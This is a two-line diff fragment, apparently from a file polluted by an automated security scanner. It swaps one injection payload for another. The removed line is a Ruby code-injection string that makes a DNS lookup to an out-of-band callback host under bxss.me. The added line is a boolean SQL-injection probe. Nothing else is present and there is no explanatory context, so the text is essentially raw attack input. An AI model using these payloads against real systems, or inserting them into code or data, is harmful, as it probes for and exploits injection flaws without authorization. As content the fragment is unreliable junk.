@@ -1,2 +1,1 @@
-"+"A".concat(70-3).concat(22*4).concat(108).concat(88).concat(99).concat(84)+(require"socket"
-Socket.gethostbyname("hitlh"+"fnsctzjf203cd.bxss.me.")[3].to_s)+"
+-1' OR 2+441-441-1=0+0+0+1 or 'mvy4vwye'='
